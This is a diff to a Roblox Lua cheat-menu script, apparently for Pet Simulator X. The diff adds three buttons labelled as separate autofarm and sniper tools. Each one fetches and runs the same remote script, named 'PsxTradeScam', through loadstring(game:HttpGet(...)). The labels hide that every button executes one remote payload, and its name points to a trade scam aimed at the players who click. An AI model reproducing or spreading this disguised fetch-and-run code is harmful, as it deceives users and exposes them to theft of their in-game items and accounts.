@@ -11,9 +11,20 @@ local MainSection = Main:NewSection("If you encounter any problems DM mesyt on d
 local Main = Window:NewTab("Autofarms")
 local MainSection = Main:NewSection("Milk Up (keyless)")
 local MainSection = Main:NewSection("Project WD (keyless)")
+local MainSection = Main:NewSection("Fruit Farm (OP)")
 
 
-MainSection:NewButton("Autofarms", "Most Popular Autofarms", function()
+MainSection:NewButton("Milk Up 🧋(keyless)", "Most popular/best auto farms for everything", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
+end)
+
+
+MainSection:NewButton("Project WD 🟪(keyless)", "Auction Sniper/Booth Sniper", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
+end)
+
+
+MainSection:NewButton("Fruit Farm 🍉", "Best/Fastest Fruit Farm", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
